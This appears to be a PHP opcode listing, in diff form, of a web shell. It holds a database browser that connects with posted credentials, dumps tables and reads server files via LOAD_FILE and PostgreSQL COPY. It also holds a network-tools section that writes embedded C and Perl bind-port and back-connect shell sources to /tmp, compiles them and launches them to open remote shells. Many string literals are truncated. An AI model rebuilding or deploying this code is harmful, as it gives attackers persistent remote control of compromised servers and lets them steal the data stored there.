+INIT_FCALL_BY_NAME 'mysql_connect'
+CONCAT ':'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'mysql_close'
+DO_FCALL 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+CONCAT 'host=''
+CONCAT '' port=''
+CONCAT '' user=''
+CONCAT '' password=''
+CONCAT '' dbname=postgres'
+INIT_FCALL_BY_NAME 'pg_connect'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'pg_close'
+DO_FCALL 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+DECLARE_CLASS 'dbclass'
+NEW 'DbClass'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'type'
+DO_FCALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+IS_EQUAL 'download'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+IS_NOT_EQUAL 'select'
+INIT_METHOD_CALL 'connect'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'sql_host'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'sql_login'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'sql_pass'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'sql_base'
+DO_FCALL 
+INIT_METHOD_CALL 'selectdb'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'sql_base'
+DO_FCALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'charset'
+SWITCH_STRING '[' 'Windows-1251':->59,' 'UTF-8':->63,' 'KOI8-R':->67,' 'KOI8-U':->71,' 'cp866':->75,' ']'
+INIT_METHOD_CALL 'setCharset'
+SEND_VAL_EX 'cp1251'
+DO_FCALL 
+INIT_METHOD_CALL 'setCharset'
+SEND_VAL_EX 'utf8'
+DO_FCALL 
+INIT_METHOD_CALL 'setCharset'
+SEND_VAL_EX 'koi8r'
+DO_FCALL 
+INIT_METHOD_CALL 'setCharset'
+SEND_VAL_EX 'koi8u'
+DO_FCALL 
+INIT_METHOD_CALL 'setCharset'
+SEND_VAL_EX 'cp866'
+DO_FCALL 
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'file'
+INIT_FCALL 'ob_start'
+SEND_VAL 'ob_gzhandler'
+DO_ICALL 
+INIT_FCALL 'header'
+SEND_VAL 'Content-Disposition: attachment; filename=dump.sql'
+DO_ICALL 
+INIT_FCALL 'header'
+SEND_VAL 'Content-Type: text/plain'
+DO_ICALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'tbl'
+FE_RESET_R 
+FE_FETCH_R 
+INIT_METHOD_CALL 'dump'
+DO_FCALL 
+INIT_FCALL 'fopen'
+FETCH_R '_POST'
+FETCH_DIM_R 'file'
+SEND_VAL 'w'
+DO_ICALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'tbl'
+FE_RESET_R 
+FE_FETCH_R 
+INIT_METHOD_CALL 'dump'
+DO_FCALL 
+INIT_FCALL 'fclose'
+DO_ICALL 
+FETCH_UNSET '_POST'
+UNSET_DIM 'p2'
+INIT_FCALL 'hardheader'
+DO_FCALL 
+INIT_FCALL 'htmlspecialchars'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+CONCAT '  <h1>Sql browser</h1><div class=content>  <form name='sf' method='post' onsubmit'
+CONCAT ''><input type=hidden name=charset value=''
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'charset'
+FETCH_R '_POST'
+FETCH_DIM_R 'charset'
+CONCAT ''>  <td><label><select name='type'><option value='mysql' '
+FETCH_R '_POST'
+FETCH_DIM_R 'type'
+IS_EQUAL 'mysql'
+ECHO 'selected'
+ECHO '>MySql</option><option value='pgsql' '
+FETCH_R '_POST'
+FETCH_DIM_R 'type'
+IS_EQUAL 'pgsql'
+ECHO 'selected'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'sql_host'
+QM_ASSIGN 'localhost'
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'sql_host'
+DO_ICALL 
+CONCAT '>PostgreSql</option></select></label></td>  <td><input type=text name=sql_host '
+CONCAT '"></td>  <td><input type=text name=sql_login value="'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'sql_login'
+QM_ASSIGN 'root'
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'sql_login'
+DO_ICALL 
+CONCAT '"></td>  <td><input type=text name=sql_pass value="'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'sql_pass'
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'sql_pass'
+DO_ICALL 
+CONCAT '" required></td><td>'
+ASSIGN '<input type=text name=sql_base value=''>'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'sql_host'
+INIT_METHOD_CALL 'connect'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'sql_host'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'sql_login'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'sql_pass'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'sql_base'
+DO_FCALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'charset'
+SWITCH_STRING '[' 'Windows-1251':->243,' 'UTF-8':->247,' 'KOI8-R':->251,' 'KOI8-U':->255,' 'cp866':->259,' ']'
+INIT_METHOD_CALL 'setCharset'
+SEND_VAL_EX 'cp1251'
+DO_FCALL 
+INIT_METHOD_CALL 'setCharset'
+SEND_VAL_EX 'utf8'
+DO_FCALL 
+INIT_METHOD_CALL 'setCharset'
+SEND_VAL_EX 'koi8r'
+DO_FCALL 
+INIT_METHOD_CALL 'setCharset'
+SEND_VAL_EX 'koi8u'
+DO_FCALL 
+INIT_METHOD_CALL 'setCharset'
+SEND_VAL_EX 'cp866'
+DO_FCALL 
+INIT_METHOD_CALL 'listDbs'
+DO_FCALL 
+ECHO '<label><select name=sql_base><option value=''></option>'
+INIT_FCALL_BY_NAME 'each'
+DO_FCALL 
+CONCAT '<option value="'
+CONCAT '" '
+FETCH_R '_POST'
+FETCH_DIM_R 'sql_base'
+QM_ASSIGN 'selected'
+CONCAT '>'
+CONCAT '</option>'
+INIT_METHOD_CALL 'fetch'
+DO_FCALL 
+ECHO '</select></label>'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'sql_count'
+QM_ASSIGN '+checked'
+CONCAT '</td>  <td><input type=submit value='submit' onclick='fs(d.sf);'><'
+CONCAT '> count the number of rows</td>  </tr>  </table>  <script> '
+INIT_FCALL 'addslashes'
+FETCH_R '_POST'
+FETCH_DIM_R 'sql_base'
+DO_ICALL 
+CONCAT '';   function fs(f) {   if(f.sql_base.value!=s_db) { f.onsubmit = function() {}'
+FETCH_OBJ_R 'link'
+ECHO '<br/><table width=100% cellpadding=2 cellspacing=0>'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'sql_base'
+INIT_METHOD_CALL 'selectdb'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'sql_base'
+DO_FCALL 
+ECHO '<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br'
+INIT_METHOD_CALL 'listTables'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'each'
+DO_FCALL 
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'sql_count'
+INIT_METHOD_CALL 'fetch'
+INIT_METHOD_CALL 'query'
+CONCAT 'SELECT COUNT(*) as n FROM '
+DO_FCALL 
+DO_FCALL 
+INIT_FCALL 'htmlspecialchars'
+DO_ICALL 
+CONCAT '<nobr><input type='checkbox' name='tbl[]' value=''
+CONCAT ''>&nbsp;<a href=# onclick="st(''
+CONCAT '',1)">'
+CONCAT '</a>'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'sql_count'
+QM_ASSIGN '&nbsp;'
+ROPE_INIT ' <small>('
+FETCH_DIM_R 'n'
+ROPE_END ')</small>'
+CONCAT '</nobr><br>'
+INIT_METHOD_CALL 'fetch'
+DO_FCALL 
+ECHO '<input type='checkbox' onclick='is();'> <input type=submit value='Dump' onclick='do'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+IS_EQUAL 'select'
+FETCH_W '_POST'
+ASSIGN_DIM 'p1'
+OP_DATA 'query'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+FETCH_W '_POST'
+ASSIGN_DIM 'p3'
+INIT_METHOD_CALL 'query'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+CONCAT 'SELECT COUNT(*) as n FROM '
+DO_FCALL 
+INIT_METHOD_CALL 'fetch'
+DO_FCALL 
+INIT_FCALL 'ceil'
+FETCH_DIM_R 'n'
+DIV 30
+DO_ICALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+CONCAT '<script>d.sf.onsubmit=function(){st("'
+CONCAT '", d.sf.p3.value)}</script><span>'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+ROPE_INIT '</span> ('
+FETCH_DIM_R 'n'
+ROPE_END ' records) Page # <input type=text name='p3' value='
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+CONCAT '>'
+FAST_CONCAT '+of+'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+CONCAT ' <a href=# onclick='st("'
+CONCAT '", '
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+SUB 1
+CONCAT ')'>&lt; Prev</a>'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+CONCAT ' <a href=# onclick='st("'
+CONCAT '", '
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+ADD 1
+CONCAT ')'>Next &gt;</a>'
+FETCH_RW '_POST'
+FETCH_DIM_RW 'p3'
+FETCH_R '_POST'
+FETCH_DIM_R 'type'
+IS_EQUAL 'pgsql'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+CONCAT 'SELECT * FROM '
+CONCAT '+LIMIT+30+OFFSET'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+MUL 30
+FETCH_W '_POST'
+ASSIGN_DIM 'p2'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+CONCAT 'SELECT * FROM `'
+CONCAT '` LIMIT '
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+MUL 30
+CONCAT ',30'
+FETCH_W '_POST'
+ASSIGN_DIM 'p2'
+ECHO '<br><br>'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+IS_EQUAL 'query'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p2'
+INIT_METHOD_CALL 'query'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+DO_FCALL 
+FETCH_OBJ_R 'res'
+ECHO '<table width=100% cellspacing=1 cellpadding=2 class=main>'
+ECHO '<tr>'
+FE_RESET_R 
+FE_FETCH_R 
+CONCAT '<th>'
+CONCAT '</th>'
+INIT_FCALL 'reset'
+DO_ICALL 
+ECHO '</tr><tr>'
+CONCAT '<tr class="l'
+CONCAT '">'
+FE_RESET_R 
+FE_FETCH_R 
+IS_EQUAL 'null'
+ECHO '<td><i>null</i></td>'
+INIT_FCALL 'nl2br'
+INIT_FCALL 'htmlspecialchars'
+DO_ICALL 
+DO_ICALL 
+CONCAT '<td>'
+CONCAT '</td>'
+ECHO '</tr>'
+INIT_METHOD_CALL 'fetch'
+DO_FCALL 
+ECHO '</table>'
+INIT_FCALL 'htmlspecialchars'
+INIT_METHOD_CALL 'error'
+DO_FCALL 
+DO_ICALL 
+CONCAT '<div><b>Error:</b> '
+CONCAT '</div>'
+ECHO '<br></form><form onsubmit='d.sf.p1.value="query";d.sf.p2.value=this.query.value;document.sf'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p2'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+IS_NOT_EQUAL 'loadfile'
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+DO_ICALL 
+ECHO '</textarea><br/><input type=submit value='Execute'>'
+ECHO '</td></tr>'
+ECHO '</table></form><br/>'
+FETCH_R '_POST'
+FETCH_DIM_R 'type'
+IS_EQUAL 'mysql'
+INIT_METHOD_CALL 'query'
+SEND_VAL_EX 'SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` ='
+DO_FCALL 
+INIT_METHOD_CALL 'fetch'
+DO_FCALL 
+ECHO '<form onsubmit='d.sf.p1.value="loadfile";document.sf.p2.value=this.f.value;document.sf.submit()'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+IS_EQUAL 'loadfile'
+INIT_METHOD_CALL 'loadFile'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'p2'
+DO_FCALL 
+INIT_FCALL 'htmlspecialchars'
+FETCH_DIM_R 'file'
+DO_ICALL 
+CONCAT '<br/><pre class=ml1>'
+CONCAT '</pre>'
+INIT_FCALL 'htmlspecialchars'
+INIT_METHOD_CALL 'error'
+DO_FCALL 
+DO_ICALL 
+ECHO '</div>'
+INIT_FCALL 'hardfooter'
+DO_FCALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'hardheader'
+DO_FCALL 
+ASSIGN '#include <stdio.h>  #include <sys/socket.h>  #include <netinet/in.h>  int main(int argc'
+ASSIGN '#!/usr/bin/perl  use Socket;  $iaddr=inet_aton($ARGV[0]) || die("Error: $!\n");  $paddr'
+ASSIGN '#include <stdio.h>  #include <string.h>  #include <unistd.h>  #include <netdb.h>  #i'
+ASSIGN '#!/usr/bin/perl  $SHELL="/bin/sh -i";  if (@ARGV < 1) { exit(1); }  use Socket;  socket'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'REMOTE_ADDR'
+CONCAT '<h1>Network tools</h1><div class=content>  <form name='nfp' onSubmit='g(null,nul'
+CONCAT '> Port: <input type='text' name='port' value='31337'> Using: <label><select name='
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p1'
+DECLARE_FUNCTION 'cf'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+IS_EQUAL 'bpc'
+INIT_FCALL_BY_NAME 'cf'
+SEND_VAL_EX '/tmp/bp.c'
+DO_FCALL 
+INIT_FCALL 'ex'
+SEND_VAL 'gcc -o /tmp/bp /tmp/bp.c'
+DO_FCALL 
+INIT_FCALL 'unlink'
+SEND_VAL '/tmp/bp.c'
+DO_ICALL 
+INIT_FCALL 'ex'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+CONCAT '/tmp/bp '
+CONCAT '+'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+CONCAT ' &'
+DO_FCALL 
+FAST_CONCAT '<pre class=ml1>'
+INIT_FCALL 'ex'
+SEND_VAL 'ps aux | grep bp'
+DO_FCALL 
+CONCAT '</pre>'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+IS_EQUAL 'bpp'
+INIT_FCALL_BY_NAME 'cf'
+SEND_VAL_EX '/tmp/bp.pl'
+DO_FCALL 
+INIT_FCALL 'ex'
+INIT_FCALL 'which'
+SEND_VAL 'perl'
+DO_FCALL 
+CONCAT ' /tmp/bp.pl '
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+CONCAT ' &'
+DO_FCALL 
+FAST_CONCAT '<pre class=ml1>'
+INIT_FCALL 'ex'
+SEND_VAL 'ps aux | grep bp.pl'
+DO_FCALL 
+CONCAT '</pre>'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+IS_EQUAL 'bcc'
+INIT_FCALL_BY_NAME 'cf'
+SEND_VAL_EX '/tmp/bc.c'
+DO_FCALL 
+INIT_FCALL 'ex'
+SEND_VAL 'gcc -o /tmp/bc /tmp/bc.c'
+DO_FCALL 
+INIT_FCALL 'unlink'
+SEND_VAL '/tmp/bc.c'
+DO_ICALL 
+INIT_FCALL 'ex'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+CONCAT '/tmp/bc '
+CONCAT '+'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+CONCAT ' &'
+DO_FCALL 
+FAST_CONCAT '<pre class=ml1>'
+INIT_FCALL 'ex'
+SEND_VAL 'ps aux | grep bc'
+DO_FCALL 
+CONCAT '</pre>'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+IS_EQUAL 'bcp'
+INIT_FCALL_BY_NAME 'cf'
+SEND_VAL_EX '/tmp/bc.pl'
+DO_FCALL 
+INIT_FCALL 'ex'
+INIT_FCALL 'which'
+SEND_VAL 'perl'
+DO_FCALL 
+CONCAT ' /tmp/bc.pl '
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+CONCAT '+'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+CONCAT ' &'
+DO_FCALL 
+FAST_CONCAT '<pre class=ml1>'
+INIT_FCALL 'ex'
+SEND_VAL 'ps aux | grep bc.pl'
+DO_FCALL 
+CONCAT '</pre>'
+ECHO '</div>'
+INIT_FCALL 'hardfooter'
+DO_FCALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'fopen'
+SEND_VAL 'w'
+DO_ICALL 
+INIT_FCALL 'function_exists'
+SEND_VAL 'file_put_contents'
+DO_ICALL 
+INIT_FCALL 'fwrite'
+INIT_FCALL 'base64_decode'
+DO_ICALL 
+DO_ICALL 
+INIT_FCALL 'fputs'
+INIT_FCALL 'base64_decode'
+DO_ICALL 
+DO_ICALL 
+INIT_FCALL 'file_put_contents'
+INIT_FCALL 'base64_decode'
+DO_ICALL 
+DO_ICALL 
+INIT_FCALL 'fclose'
+DO_ICALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+ASSIGN_OBJ 'type'
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_OBJ_R 'type'
+SWITCH_STRING '[' 'mysql':->11,' 'pgsql':->25,' ']'
+INIT_FCALL_BY_NAME 'mysql_connect'
+DO_FCALL 
+ASSIGN_OBJ 'link'
+RETURN 
+INIT_FCALL 'explode'
+SEND_VAL ':'
+DO_ICALL 
+INIT_FCALL_BY_NAME 'pg_connect'
+ROPE_INIT 'host='
+ROPE_ADD ' port='
+ROPE_ADD ' user='
+ROPE_ADD ' password='
+ROPE_ADD ' dbname='
+DO_FCALL 
+ASSIGN_OBJ 'link'
+RETURN 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_OBJ_R 'type'
+INIT_FCALL_BY_NAME 'mysql_select_db'
+DO_FCALL 
+RETURN 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_OBJ_R 'type'
+SWITCH_STRING '[' 'mysql':->8,' 'pgsql':->18,' ']'
+INIT_FCALL_BY_NAME 'mysql_query'
+DO_FCALL 
+ASSIGN_OBJ 'res'
+RETURN 
+INIT_FCALL_BY_NAME 'pg_query'
+FETCH_OBJ_FUNC_ARG 'link'
+DO_FCALL 
+ASSIGN_OBJ 'res'
+RETURN 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FUNC_NUM_ARGS 
+INIT_FCALL 'func_get_arg'
+DO_ICALL 
+FETCH_OBJ_R 'res'
+FETCH_OBJ_R 'type'
+SWITCH_STRING '[' 'mysql':->17,' 'pgsql':->25,' ']'
+INIT_FCALL_BY_NAME 'mysql_fetch_assoc'
+DO_FCALL 
+RETURN 
+INIT_FCALL_BY_NAME 'pg_fetch_assoc'
+DO_FCALL 
+RETURN 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_OBJ_R 'type'
+SWITCH_STRING '[' 'mysql':->7,' 'pgsql':->13,' ']'
+INIT_METHOD_CALL 'query'
+SEND_VAL_EX 'SHOW+databas'
+DO_FCALL 
+RETURN 
+INIT_METHOD_CALL 'query'
+SEND_VAL_EX 'SELECT datname FROM pg_database WHERE datistemplate!='t''
+DO_FCALL 
+ASSIGN_OBJ 'res'
+RETURN 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_OBJ_R 'type'
+SWITCH_STRING '[' 'mysql':->7,' 'pgsql':->15,' ']'
+INIT_METHOD_CALL 'query'
+SEND_VAL_EX 'SHOW+TABLES'
+DO_FCALL 
+ASSIGN_OBJ 'res'
+RETURN 
+INIT_METHOD_CALL 'query'
+SEND_VAL_EX 'select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema '
+DO_FCALL 
+ASSIGN_OBJ 'res'
+RETURN 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_OBJ_R 'type'
+SWITCH_STRING '[' 'mysql':->7,' 'pgsql':->14,' ']'
+INIT_FCALL_BY_NAME 'mysql_error'
+DO_FCALL 
+RETURN 
+INIT_FCALL_BY_NAME 'pg_last_error'
+DO_FCALL 
+RETURN 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_OBJ_R 'type'
+SWITCH_STRING '[' 'mysql':->8,' 'pgsql':->28,' ']'
+INIT_FCALL 'function_exists'
+SEND_VAL 'mysql_set_charset'
+DO_ICALL 
+INIT_FCALL_BY_NAME 'mysql_set_charset'
+FETCH_OBJ_FUNC_ARG 'link'
+DO_FCALL 
+RETURN 
+INIT_METHOD_CALL 'query'
+CONCAT 'SET+CHARSET+'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'pg_set_client_encoding'
+FETCH_OBJ_FUNC_ARG 'link'
+DO_FCALL 
+RETURN 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_OBJ_R 'type'
+SWITCH_STRING '[' 'mysql':->8,' 'pgsql':->22,' ']'
+INIT_METHOD_CALL 'fetch'
+INIT_METHOD_CALL 'query'
+INIT_FCALL 'addslashes'
+DO_ICALL 
+CONCAT 'SELECT LOAD_FILE(''
+CONCAT '') as file'
+DO_FCALL 
+DO_FCALL 
+RETURN 
+INIT_METHOD_CALL 'query'
+INIT_FCALL 'addslashes'
+DO_ICALL 
+CONCAT 'CREATE TABLE hard2(file text);COPY hard2 FROM ''
+CONCAT '';select file from hard2;'
+DO_FCALL 
+FETCH_DIM_R 'file'
+INIT_METHOD_CALL 'fetch'
+DO_FCALL 
+INIT_METHOD_CALL 'query'
+SEND_VAL_EX 'drop+table+hard2'
+DO_FCALL 
+INIT_FCALL 'implode'
+SEND_VAL ' '
+DO_ICALL 
+INIT_ARRAY 'file'
+RETURN 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_OBJ_R 'type'
+SWITCH_STRING '[' 'mysql':->9,' 'pgsql':->119,' ']'
+INIT_METHOD_CALL 'query'
+CONCAT 'SHOW CREATE TABLE `'
+CONCAT '`'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'mysql_fetch_array'
+DO_FCALL 
+CONCAT '; '
+INIT_FCALL 'fwrite'
+DO_ICALL 
+INIT_METHOD_CALL 'query'
+CONCAT 'SELECT * FROM `'
+CONCAT '`'
+DO_FCALL 
+MOD 1000
+ASSIGN '; '
+FE_RESET_R 
+FE_FETCH_R 
+OP_DATA 'NULL'
+INIT_FCALL_BY_NAME 'mysql_real_escape_string'
+DO_FCALL 
+CONCAT '''
+CONCAT '''
+CONCAT '`'
+CONCAT '`'
+CONCAT 'INSERT INTO `'
+CONCAT '` ('
+INIT_FCALL 'implode'
+SEND_VAL ', '
+DO_ICALL 
+CONCAT ') VALUES  ('
+INIT_FCALL 'implode'
+SEND_VAL ', '
+DO_ICALL 
+CONCAT ')'
+INIT_FCALL 'implode'
+SEND_VAL ', '
+DO_ICALL 
+CONCAT ' ,('
+CONCAT ')'
+INIT_FCALL 'fwrite'
+DO_ICALL 
+INIT_METHOD_CALL 'fetch'
+DO_FCALL 
+INIT_FCALL 'fwrite'
+SEND_VAL '; '
+DO_ICALL 
+ECHO '; '
+INIT_METHOD_CALL 'query'
+CONCAT 'SELECT * FROM '
+DO_FCALL 
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL 'addslashes'
+DO_ICALL 
+CONCAT '''
+CONCAT '''
+CONCAT 'INSERT+INTO+'
+CONCAT ' ('
+INIT_FCALL 'implode'
+SEND_VAL ', '
+DO_ICALL 
+CONCAT ') VALUES ('
+INIT_FCALL 'implode'
+SEND_VAL ', '
+DO_ICALL 
+CONCAT ');'
+CONCAT ' '
+INIT_FCALL 'fwrite'
+DO_ICALL 
+INIT_METHOD_CALL 'fetch'
+DO_FCALL 
+RETURN 
+RETURN 'null'
+FunctionEnd 
